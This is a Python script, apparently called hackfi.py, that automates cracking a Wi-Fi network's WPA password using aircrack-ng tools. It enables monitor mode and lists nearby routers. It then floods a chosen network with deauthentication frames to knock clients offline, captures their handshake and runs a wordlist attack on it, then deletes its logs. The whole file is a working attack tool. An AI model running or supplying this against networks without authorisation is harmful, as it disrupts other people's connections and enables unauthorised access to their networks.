import subprocess
import os
import sys
import pandas as pd
import time
from threading import Thread


user = subprocess.check_output("whoami", shell=True).decode().split("\n")[0]

if user == "root":
    try:
        wordlist = sys.argv[1]


        def enableMonitorMode(iface):
            print("[+] Removing previous logs...")
            os.system("rm airodump-*")
            os.system("rm connected-*")
            print("[+] Logs cleared successfully !\n")

            os.system("airmon-ng check kill")

            cmd = "airmon-ng start " + iface
            print("Trying to enable Monitor Mode...")
            enable = subprocess.check_output(cmd, shell=True)

            en_stts = "monitor mode vif enabled"
            al_en_stts = "monitor mode already enabled"

            if en_stts in enable.decode():
                return True
            elif al_en_stts in enable.decode():
                return True
            else:
                return False

        '''
            enableMonitorMode returns True or False
            
        '''

        def disableMonitorMode(iface):
            cmd = "airmon-ng stop " + iface
            print("Trying to disable Monitor Mode...")
            disable = subprocess.check_output(cmd, shell=True)

            dis_stts = "monitor mode vif disabled"
            csv_file = "airodump-01.csv"


            if dis_stts in disable.decode():
                os.remove(csv_file)
                return True
            else:
                return False

        '''
            disableMonitorMode returns True or False

        '''

        def airoDump(iface):
            print("\n[+] Scanning for available routers...")
            print("[!] Press Ctrl + C when you find your router.")
            time.sleep(3)
            cmd = "airodump-ng -w airodump --output-format csv " + iface
            os.system(cmd)
            csv_file = "airodump-01.csv"

            os.system("clear")

            df = pd.read_csv(csv_file)
            df = df.dropna()

            ESSID = df[' ESSID']
            BSSID = df['BSSID']

            print("[+] Available Routers :\n-----------------------------------------------------")
            print("Index\t\tESSID\t\t\tBSSID\n-----------------------------------------------------")

            for i in range(len(ESSID)):
                print(i, '\t', ESSID[i], '\t\t', BSSID[i])
            print("-----------------------------------------------------")

            essid_index = int(input("Enter ESSID Index : "))

            if essid_index in range(len(ESSID)):
                return df, essid_index

            else:
                print("[-] Invalid Index ! Please wait...\n\n")
                airoDump(iface)

        '''
            airoDump returns df and essid index
        
        '''

        def extractBSSIDCh(interface, df, index):
            modem_df = df.loc[index]
            bssid = modem_df["BSSID"]
            ch = modem_df[" channel"]

            cmd = "airodump-ng -w connected --output-format csv -c " + str(ch) + " --bssid " + bssid + " " + interface
            os.system(cmd)

            con_csv = "connected-01.csv"
            os.remove(con_csv)

            return bssid, ch

        '''
            extractBSSIDCh returns bssid and ch
        
        '''

        def disconnectStation(iface, bssid):
            cmd = "xterm -e /bin/bash -l -c 'aireplay-ng --deauth 10 -a " + bssid + " " + iface + "'"

            print("Deauthenticating connect device...")
            os.system(cmd)
            print("\n[+] Deauthentication Process Done !")

        def getCap(iface, bssid, channel):
            print("\n[!] Press Ctrl+C whenever connected device found !")
            cmd = "xterm -e /bin/bash -l -c 'airodump-ng -w handshake --output-format cap -c " + str(channel) + " --bssid " + bssid + " " + iface + "'"
            os.system(cmd)

        def captureHandshake(iface, bssid, channel):
            t1 = Thread(target=disconnectStation, args=(iface, bssid))
            t2 = Thread(target=getCap, args=(iface, bssid, channel))

            t2.start()
            time.sleep(2)
            t1.start()

            t1.join()
            t2.join()

            print("\n[+] Handshake file captured !\n")

        def crackPassword(wordlist):
            cmd = "aircrack-ng handshake-01.cap -w " + wordlist
            os.system(cmd)
            subprocess.check_output("mv handshake-01.cap ./bin/", shell=True)


        def main():

            try:
                iface = subprocess.check_output("iw dev | awk '$1==\"Interface\"{print $2}'", shell=True)[:-1].decode()
                enstatus = enableMonitorMode(iface)

                if enstatus == True:
                    print("[+] Monitor Mode enabled successfully !")
                    iface = subprocess.check_output("iw dev | awk '$1==\"Interface\"{print $2}'", shell=True)[:-1].decode()

                    df, essid_index = airoDump(iface)

                    bssid, channel = extractBSSIDCh(iface, df, essid_index)
                    captureHandshake(iface, bssid, channel)

                    distatus = disableMonitorMode(iface)

                    if distatus == True:
                        print("[+] Monitor Mode disabled successfully !")

                    else:
                        print("[-] Unable to disable Monitor Mode ! Disable it manually. [cmd : airmon-ng stop <interface>]")

                    crackPassword(wordlist)

                else:
                    print("[-] Unable to enable Monitor Mode ! Enable it manually. [cmd : airmon-ng start <interface>]")



            except KeyboardInterrupt:
                iface = subprocess.check_output("iw dev | awk '$1==\"Interface\"{print $2}'", shell=True)[:-1].decode()
                distatus = disableMonitorMode(iface)

                if distatus == True:
                    print("[+] Monitor Mode disabled successfully !")

                else:
                    print("[-] Unable to disable Monitor Mode ! Disable it manually. [cmd : airmon-ng stop <interface>]")

        if __name__ == '__main__':
            main()
            subprocess.call("rm airodump-*", shell=True)
            subprocess.call("rm connected-*", shell=True)
            subprocess.call("rm handshake-*", shell=True)
            print("[+] Done !")


    except IndexError:
        print("[-] Wordlist Missing ! \n\nusage : sudo python3 hackfi.py <wordlist>")

else:
    print("\n[-_-] Are you fucking drunk !!! Run this script as root !\n")